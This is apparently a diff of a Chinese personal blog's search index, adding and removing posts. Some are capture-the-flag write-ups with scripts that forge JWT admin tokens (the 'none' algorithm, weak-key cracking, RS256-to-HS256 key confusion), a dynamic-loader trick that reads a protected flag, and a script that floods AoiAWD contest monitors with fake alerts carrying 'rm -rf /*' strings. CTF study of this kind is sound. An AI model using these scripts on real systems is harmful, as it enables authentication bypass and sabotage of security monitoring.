+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254083805-46.png" alt="请添加图片描述">返回提交 token<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254086176-49.png" alt="请添加图片描述"></p>
+<h2 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h2><p>把 cookie 清空后提交用户名密码</p>
+<p>得到一串 jwt</p>
+<p>丢进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254091115-52.png" alt="请添加图片描述"><br>发现是 RS256 编码（不对称式编码)</p>
+<p>需要改为对称式编码</p>
+<p>如 HS256</p>
+<p>题目中给了 public key</p>
+<p>用 PUBLIC_KEY 采用 HS256 进行加密 payload 构造 token</p>
+<p>借用<a href="https://blog.csdn.net/loseheart157">大神 h0ld1rs</a>的脚本</p>
+<blockquote>
+<p>无签名那段脚本</p>
+<p>是勉勉强强写出来的</p>
+<p>这题就先用大神的脚本吧</p>
+<p>我太菜了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;publickey.pem&#x27;</span>)<span class="comment">#需要将文中的publickey下载	与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">## Paste your header and payload here</span></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br></pre></td></tr></table></figure>
+
+<p>运行后把 token 返回去验证</p>
+<p>成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254094160-55.png" alt="请添加图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254096594-58.png" alt="请添加图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>jwt</tag>
+        <tag>json web token</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>htb-Shoppy</title>
     <url>/2022/10/htb-Shoppy/</url>
     <content><![CDATA[<blockquote>
@@ -839,66 +899,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-jwt</title>
-    <url>/2022/09/jwt/</url>
-    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt 基础知识</a></p>
-<p>flag 在下面</p>
-<p>需要了解一下 jwt 组成部分</p>
-<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>随便输个</p>
-<p>进去查消息头</p>
-<p>然后在</p>
-<p><a href="https://jwt.io/">jwt.io</a></p>
-<p>decode 一共两部分 ag 是另一半<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254077114-40.png" alt="请添加图片描述"></p>
-<h2 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line">encoded = jwt.encode(payload,key,algorithm)</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure>
-
-<p>jwt 的签名可以为无</p>
-<blockquote>
-<p>今天写这个脚本的时候命名为 jwt.py</p>
-<p>结果报错 但是系统环境运行正常</p>
-<p>才知道是文件名的事</p>
-<p>import jwt 他先自己引用自己了</p>
-</blockquote>
-<p>抓包</p>
-<p>把 cookie 里的 token 改为这脚本的运行结果</p>
-<h2 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h2><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a></p>
-<p>依次执行即可</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./c-jwt-cracker</span><br><span class="line">make</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</span><br></pre></td></tr></table></figure>
-
-<p>然后得出该 jwt 密钥</p>
-<p>然后放之前那个网站</p>
-<p>改 role 为 admin</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254081515-43.png" alt="请添加图片描述"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254083805-46.png" alt="请添加图片描述">返回提交 token<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254086176-49.png" alt="请添加图片描述"></p>
-<h2 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h2><p>把 cookie 清空后提交用户名密码</p>
-<p>得到一串 jwt</p>
-<p>丢进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254091115-52.png" alt="请添加图片描述"><br>发现是 RS256 编码（不对称式编码)</p>
-<p>需要改为对称式编码</p>
-<p>如 HS256</p>
-<p>题目中给了 public key</p>
-<p>用 PUBLIC_KEY 采用 HS256 进行加密 payload 构造 token</p>
-<p>借用<a href="https://blog.csdn.net/loseheart157">大神 h0ld1rs</a>的脚本</p>
-<blockquote>
-<p>无签名那段脚本</p>
-<p>是勉勉强强写出来的</p>
-<p>这题就先用大神的脚本吧</p>
-<p>我太菜了</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;publickey.pem&#x27;</span>)<span class="comment">#需要将文中的publickey下载	与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">## Paste your header and payload here</span></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br></pre></td></tr></table></figure>
-
-<p>运行后把 token 返回去验证</p>
-<p>成功</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254094160-55.png" alt="请添加图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254096594-58.png" alt="请添加图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>jwt</tag>
-        <tag>json web token</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>力扣 394.字符串解码 特殊解</title>
     <url>/2025/02/leetcode%20394/</url>
     <content><![CDATA[<p><a href="https://leetcode.cn/problems/decode-string">394.字符串解码</a></p>
@@ -923,43 +923,6 @@
       <tags>
         <tag>leetcode</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux动态加载</title>
-    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了 shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
-<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
-
-<p>get</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
       </tags>
   </entry>
   <entry>
@@ -1100,84 +1063,40 @@
       </tags>
   </entry>
   <entry>
-    <title>AoiAWD反制脚本</title>
-    <url>/2024/05/untiAoi/</url>
-    <content><![CDATA[<h2 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
-<p>赛后研究了一下</p>
-<p>开发了这个反制脚本</p>
-<p>由于打点队友喜欢用 gogo</p>
-<p>所以这个脚本支持 gogo 扫描结果</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>发现后端未验证来自靶机的数据</p>
-<p>因此存在脏数据污染</p>
-<p>针对此开发脚本</p>
-<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
-<p>包括告警页面</p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./ip.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line">url_list = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">    pattern = <span class="string">r&quot;tcp://(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, i, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        i = <span class="keyword">match</span>.group(<span class="number">0</span>).split(<span class="string">&quot;//&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        i = i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        server_address = (i, p)  <span class="comment"># 替换SERVER_IP和SERVER_PORT为实际值</span></span><br><span class="line">        data = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;ping&quot;&#125;\n&#x27;</span></span><br><span class="line">        data2 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:&#123;&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data3 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data4 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:&#123;&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;&#123;\\&quot;flag\\&quot;:\\&quot;flag&#123;Crazy_Thurthday_v_me_50&#125;\\&quot;&#125;&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data5 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data6 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data7 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sock.settimeout(<span class="number">1</span>)</span><br><span class="line">                sock.connect(server_address)</span><br><span class="line">                sock.sendall(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                tmp = sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;pong&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tmp):</span><br><span class="line">                    sock.sendall(data2.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data3.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data4.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">                        sock.sendall(data7.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data6.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data5.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;i&#125;</span>\n&quot;</span>)</span><br><span class="line">                    sock.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;\n[-] --------------------------------<span class="subst">&#123;i&#125;</span>-------------------------------------\n&quot;</span></span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h3><p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
-<p>决定模仿 aoi、并借鉴其他各个工具</p>
-<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
-<p>但是目前没有时间开发(<del>别问，问就是鸽</del>)</p>
-<p><del>预计会在 2025 年 5 月问世</del> ：)</p>
-<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
-<p>以及分析了解过官方 check 机制的师傅</p>
-<p>以及有大量参加 AWD 经验的大师傅</p>
-<p>欢迎联系本菜鸡</p>
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>AoiAWD</tag>
-        <tag>反制脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vue gin合并部署(完美方案)</title>
-    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
-<p>二者合并部署的教程非常少，且各有各的问题</p>
-<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
-<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>使用 axios 时进行如下配置</p>
-<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
-<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
-<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
-<p>同时</p>
-<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
-<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
-
-<p>方便一部送到位</p>
-<h2 id="gin"><a href="#gin" class="headerlink" title="gin"></a>gin</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
-
-<p>main.go 添加 embed 和路由</p>
